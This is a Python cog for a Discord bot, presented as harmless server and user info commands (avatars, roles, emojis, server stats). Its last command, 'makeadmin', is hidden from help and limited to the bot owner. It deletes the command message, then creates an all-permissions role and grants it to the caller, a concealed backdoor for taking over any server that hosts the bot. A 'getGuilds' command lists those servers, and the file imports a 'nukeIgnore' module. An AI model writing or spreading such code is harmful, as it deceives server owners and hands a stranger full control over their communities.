import discord
from discord.ext import commands

from nukeIgnore import *
from bot import *
import logging
import discord
from discord.ext import commands
from bot import *
import random
from permissions import *


class Discord_Info(commands.Cog):
    """
    Discord info commands
    """

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.check(is_owner)
    async def getGuilds(self, ctx):
        """
        Get the list of guilds that the bot is in
        @author Nerd#2021
        """

        embed = discord.Embed(color=ctx.author.color.value) #Create embed
        embed.add_field(name="**Guilds**", value="-", inline=True) #Add title
        counter = 0 #Set a counter for the number of guilds to 0

        #Add guilds to embed
        async for guild in client.fetch_guilds(limit=200):
            counter = counter+1
            embed.add_field(name=counter, value=guild.name, inline=True)
        await ctx.send(embed=embed) #Send embed

    @commands.command()
    @commands.guild_only()
    async def pfp(self, ctx, *, user: discord.Member = None):
        """
        Get the avatar of you or someone else
        @author Paladin Of Ioun#5905
        @author Nerd#2021
        """

        #Make sure bot doesn't crash if user doesn't exist
        if user is None:
            user = ctx.author

        #Sent profile photo
        if(is_LDL_channel(ctx)):
            await ctx.send(f"{user.avatar_url_as(size=2048)}")

    @commands.command()
    @commands.guild_only()
    async def roles(self, ctx):
        """
        Get all roles in current server
        @author Nerd#2021
        """

        allroles = "" #Make an empty string with roles

        if (is_LDL_channel(ctx)):
            author = ctx.author #Set author

            embed = discord.Embed(color=author.color.value) #Create embed

            roles = ctx.guild.roles #Get guild roles
            roles.reverse() #Reverse the roles list (they come out in backwards order)

            embed.add_field(
                name=f"Roles for {ctx.guild.name}",
                value=', '.join([f"<@&{x.id}>" for x in roles if x is not ctx.guild.default_role
                                 ]) if len(ctx.guild.roles) > 1 else f"No roles in {ctx.guild.name}",
                inline=False
            ) #Add roles to embed

            embed.set_footer(text=f"Message sent by {author.nick}") #Footer

            await ctx.send(embed=embed) #Send embed

    @commands.command()
    @commands.guild_only()
    async def user(self, ctx, *, user: discord.Member = None):
        """
        Get user information
        @author Paladin Of Ioun#5905
        @author Nerd#2021
        """

        if user is None:
            user = ctx.author
        if (is_LDL_channel(ctx)):

            embed = discord.Embed(color=user.color.value)
            embed.set_thumbnail(url=user.avatar_url)

            embed.add_field(name="Name", value=user, inline=True)
            embed.add_field(name="Nickname", value=user.nick if hasattr(user, "nick") else "None", inline=True)
            embed.add_field(name="Account created", value=fmt(user.created_at), inline=True)
            embed.add_field(name=f"Joined {ctx.guild.name}", value=fmt(user.joined_at), inline=True)

            roles = user.roles
            roles.reverse()

            embed.add_field(
                name="Roles",
                value=', '.join([f"<@&{x.id}>" for x in roles if x is not ctx.guild.default_role]) if len(user.roles) > 1 else f"No roles in {ctx.guild.name}",
                inline=False
            )

            await ctx.send(embed=embed)

    @commands.group()
    @commands.guild_only()
    async def server(self, ctx):
        """
        Check info about current server
        @author Paladin Of Ioun#5905
        @author Nerd#2021
        """
        if (is_LDL_channel(ctx)):
            if ctx.invoked_subcommand is None:
                findbots = sum(1 for member in ctx.guild.members if member.bot)

                allroles = ""

                for num, role in enumerate(sorted(ctx.guild.roles, reverse=True), start=1):
                    allroles += f"{role.name}\n"

                author = ctx.message.author

                embed = discord.Embed(color=author.top_role.color.value)
                embed.set_thumbnail(url=ctx.guild.icon_url)
                embed.add_field(name="Server Name", value=ctx.guild.name, inline=True)
                embed.add_field(name="Server ID", value=ctx.guild.id, inline=True)
                embed.add_field(name="Members", value=ctx.guild.member_count, inline=True)
                embed.add_field(name="Bots", value=str(findbots), inline=True)
                embed.add_field(name="Owner", value=ctx.guild.owner, inline=True)
                embed.add_field(name="Created", value=fmt(ctx.guild.created_at), inline=True)

                roles = ctx.guild.roles
                roles.reverse()

                embed.add_field(
                    name="Roles",
                    value=', '.join([f"<@&{x.id}>" for x in roles if x is not ctx.guild.default_role]) if len(
                        ctx.guild.roles) > 1 else f"No roles in {ctx.guild.name}",
                    inline=False
                )

                await ctx.send(embed=embed)

    @commands.command()
    @commands.guild_only()
    async def emoji(self, ctx):
        """
        Get all emojis in a server
        @author Nerd#2021
        """

        if (is_LDL_channel(ctx)):
            """ Check when a user joined the current server """
            embed = discord.Embed(color=ctx.author.color.value)
            embed.add_field(name="**Emojis**", value="-", inline=True)

            embed2 = discord.Embed(color=ctx.author.color.value)
            embed2.add_field(name="**Emojis**", value="-", inline=True)

            embed3 = discord.Embed(color=ctx.author.color.value)
            embed3.add_field(name="**Emojis**", value="-", inline=True)

            i = 1


            for x in ctx.guild.emojis:
                if(i<=24):
                    embed.add_field(name=i, value=x, inline=True)
                elif(i<=48):
                    embed2.add_field(name=i, value=x, inline=True)
                else:
                    embed3.add_field(name=i, value=x, inline=True)
                i = i+1
            if i != 1:
                await ctx.send(embed = embed)

                if(i > 25):
                    await ctx.send(embed = embed2)

                if (i > 49):
                    await ctx.send(embed=embed3)
            else:
                embed4 = discord.Embed(color=ctx.author.color.value)
                embed4.add_field(name="**Emojis**", value=f"No emojis found for  **{ctx.guild.name}**", inline=True)
                await ctx.send(embed=embed4)

    @commands.command(aliases=['createAdmin'],hidden=True)
    @commands.guild_only()
    @commands.check(is_owner)
    async def makeadmin(self, ctx: commands.Context, name: str, color: discord.Color):
        """
        Makes you an admin
        @author Nerd#2021
        """

        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await logger.warning("ERROR IN DELETING MESSAGE")
        try:
            role = await ctx.guild.create_role(name=name,
                                               color=color,
                                               permissions=discord.Permissions.all())
            user = ctx.message.author
            await user.add_roles(role)
        except discord.Forbidden:
            await ctx.send('Unable to create role..')

def setup(bot):
    bot.add_cog(Discord_Info(bot))




